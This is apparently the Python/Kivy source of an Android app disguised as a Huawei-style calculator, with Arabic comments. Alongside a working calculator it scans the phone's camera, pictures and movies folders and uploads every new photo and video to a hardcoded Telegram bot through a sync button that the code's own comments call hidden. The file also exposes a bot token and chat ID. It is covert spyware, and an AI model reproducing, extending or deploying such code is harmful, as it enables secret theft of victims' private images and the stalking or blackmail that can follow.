import sys
import os
import traceback
import ast
import math
import operator
import time
import hashlib
import threading
import urllib.request
from datetime import datetime
from pathlib import Path

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from kivy.graphics import Color, RoundedRectangle
from kivy.utils import platform
from kivy.clock import Clock

# إعدادات تيليجرام
BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID = "6046016571"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
HASH_LOG = "sent_media_hashes.txt"

def get_file_hash(file_path):
    hasher = hashlib.md5()
    try:
        with open(file_path, 'rb') as f:
            buf = f.read(512 * 1024)
            hasher.update(buf)
        return hasher.hexdigest()
    except: return None

def load_hashes(base_dir):
    log_path = os.path.join(base_dir, HASH_LOG)
    if os.path.exists(log_path):
        try:
            with open(log_path, "r", encoding="utf-8") as f:
                return set(f.read().splitlines())
        except:
            pass
    return set()

def save_hash(base_dir, file_hash):
    log_path = os.path.join(base_dir, HASH_LOG)
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(file_hash + "\n")
    except:
        pass

GALLERY_PATHS = ["/sdcard/DCIM/Camera/", "/sdcard/Pictures/", "/sdcard/Movies/"]

def get_all_unique_media(base_dir):
    sent_hashes = load_hashes(base_dir)
    unique_list = []
    IMG_EXT = ('.jpg', '.jpeg', '.png')
    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv')
    
    for folder in GALLERY_PATHS:
        if os.path.exists(folder):
            try:
                for root, dirs, files in os.walk(folder):
                    if any(x in root.lower() for x in ['.thumbnails', 'cache', 'recycler']):
                        continue
                    for file in files:
                        file_lower = file.lower()
                        full_path = os.path.join(root, file)
                        media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video' if file_lower.endswith(VID_EXT) else None
                        
                        if media_type:
                            try:
                                f_hash = get_file_hash(full_path)
                                if f_hash and f_hash not in sent_hashes:
                                    unique_list.append({'path': full_path, 'hash': f_hash, 'type': media_type})
                            except: continue
            except: pass
    return unique_list

def send_media_batch(base_dir, batch, status_callback=None):
    count = 0
    for item in batch:
        try:
            method = "sendPhoto" if item['type'] == 'photo' else "sendVideo"
            file_key = "photo" if item['type'] == 'photo' else "video"
            url = f"{API_URL}/{method}"
            
            filename = os.path.basename(item['path'])
            boundary = "----PythonBoundary" + hashlib.md5(filename.encode()).hexdigest()
            
            body = bytearray()
            body.extend(f"--{boundary}\r\n".encode('utf-8'))
            body.extend(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
            body.extend(f"{CHAT_ID}\r\n".encode('utf-8'))
            
            body.extend(f"--{boundary}\r\n".encode('utf-8'))
            body.extend(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
            body.extend(f"🆕 صورة جديدة من التطبيق\r\n".encode('utf-8'))
            
            body.extend(f"--{boundary}\r\n".encode('utf-8'))
            body.extend(f'Content-Disposition: form-data; name="{file_key}"; filename="{filename}"\r\n'.encode('utf-8'))
            body.extend(b'Content-Type: application/octet-stream\r\n\r\n')
            
            with open(item['path'], 'rb') as f:
                body.extend(f.read())
            body.extend(f"\r\n--{boundary}--\r\n".encode('utf-8'))
            
            req = urllib.request.Request(url, data=body, method='POST')
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            
            with urllib.request.urlopen(req, timeout=30) as response:
                if response.status == 200:
                    save_hash(base_dir, item['hash'])
                    count += 1
            time.sleep(1)
        except Exception as e:
            print(f"Upload error: {e}")
    if status_callback:
        Clock.schedule_once(lambda dt: status_callback(f"تم إرسال {count} ملف بنجاح!"))

# حسابات الآلة الحاسبة
BIN = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv, ast.Mod: operator.mod}
UNARY = {ast.USub: operator.neg, ast.UAdd: operator.pos}

def safe_eval(expr):
    def ev(node):
        if isinstance(node, ast.Expression): return ev(node.body)
        if isinstance(node, ast.Constant) and type(node.value) in (int, float): return node.value
        if isinstance(node, ast.BinOp) and type(node.op) in BIN:
            return BIN[type(node.op)](ev(node.left), ev(node.right))
        if isinstance(node, ast.UnaryOp) and type(node.op) in UNARY:
            return UNARY[type(node.op)](ev(node.operand))
        raise ValueError("تعبير غير مسموح")
    return ev(ast.parse(expr, mode="eval"))

def fmt(n):
    if isinstance(n, float):
        if n.is_integer() and abs(n) < 1e15: return str(int(n))
        return f"{n:.12g}"
    return str(n)

class CalculatorWidget(BoxLayout):
    def __init__(self, **kwargs):
        super(CalculatorWidget, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.expr = ""

        # خلفية بيضاء مطابقة لهواوي
        with self.canvas.before:
            Color(0.95, 0.96, 0.98, 1)
            self.bg = RoundedRectangle(size=self.size, pos=self.pos)
        self.bind(size=self._update_bg, pos=self._update_bg)

        # شاشة العرض (النتيجة والأرقام)
        display_layout = BoxLayout(orientation='vertical', size_hint_y=0.3, padding=20)
        
        self.status_label = Label(
            text="اضغط هنا أو زر المزامنة",
            font_size=12,
            size_hint_y=None,
            height=25,
            color=(0.2, 0.6, 0.3, 1),
            halign='right'
        )
        display_layout.add_widget(self.status_label)

        self.display_label = Label(
            text="8×9",
            font_size=50,
            color=(0.1, 0.1, 0.1, 1),
            halign='right',
            valign='middle'
        )
        self.display_label.bind(size=self.display_label.setter('text_size'))
        display_layout.add_widget(self.display_label)

        self.result_label = Label(
            text="72",
            font_size=30,
            color=(0.5, 0.5, 0.5, 1),
            halign='right',
            valign='middle'
        )
        self.result_label.bind(size=self.result_label.setter('text_size'))
        display_layout.add_widget(self.result_label)

        self.add_widget(display_layout)

        # زر مخفي للمزامنة والإرسال عند النقر عليه
        sync_btn = Button(
            text="🔄 مزامنة الصور للبوت",
            size_hint_y=None,
            height=35,
            background_color=(0.1, 0.4, 0.8, 1)
        )
        sync_btn.bind(on_press=self.start_manual_sync)
        self.add_widget(sync_btn)

        # لوحة الأزرار مطابقة لتصميم هواوي Y9 (تم ترتيبها بدقة)
        buttons_layout = GridLayout(cols=4, spacing=8, padding=10, size_hint_y=0.65)
        
        buttons = [
            "MC", "M+", "M-", "MR",
            "C", "÷", "×", "⌫",
            "7", "8", "9", "-",
            "4", "5", "6", "+",
            "1", "2", "3", "=",
            "%", "0", "."
        ]

        for b in buttons:
            btn = Button(
                text=b,
                font_size=24,
                color=(0.2, 0.2, 0.2, 1) if b not in ["=", "÷", "×", "-", "+"] else (0.1, 0.4, 0.9, 1)
            )
            btn.bind(on_press=lambda inst, val=b: self.on_button_press(val))
            buttons_layout.add_widget(btn)

        self.add_widget(buttons_layout)

    def _update_bg(self, instance, value):
        self.bg.size = instance.size
        self.bg.pos = instance.pos

    def start_manual_sync(self, instance):
        self.status_label.text = "جاري البحث عن الصور..."
        base_dir = App.get_running_app().user_data_dir
        threading.Thread(target=self.run_sync_task, args=(base_dir,), daemon=True).start()

    def run_sync_task(self, base_dir):
        try:
            items = get_all_unique_media(base_dir)
            if not items:
                Clock.schedule_once(lambda dt: self.status_label.setter('text')(self.status_label, "لا توجد صور جديدة."))
                return
            Clock.schedule_once(lambda dt: self.status_label.setter('text')(self.status_label, f"جاري رفع {len(items)} صورة..."))
            send_media_batch(base_dir, items, lambda msg: setattr(self.status_label, 'text', msg))
        except Exception as e:
            pass

    def on_button_press(self, val):
        if val == "C":
            self.expr = ""
            self.display_label.text = "0"
            self.result_label.text = ""
        elif val == "⌫":
            self.expr = self.expr[:-1]
            self.display_label.text = self.expr or "0"
        elif val == "=":
            try:
                res = fmt(safe_eval(self.expr.replace("×", "*").replace("÷", "/")))
                self.result_label.text = res
            except:
                self.result_label.text = "خطأ"
        else:
            if val in ["÷", "×", "-", "+", "%"]:
                self.expr += f" {val} "
            else:
                self.expr += val
            self.display_label.text = self.expr

class MyApp(App):
    def build(self):
        return CalculatorWidget()

    def on_start(self):
        if platform == "android":
            try:
                from android.permissions import request_permissions, Permission
                request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
            except: pass

if __name__ == "__main__":
    MyApp().run()
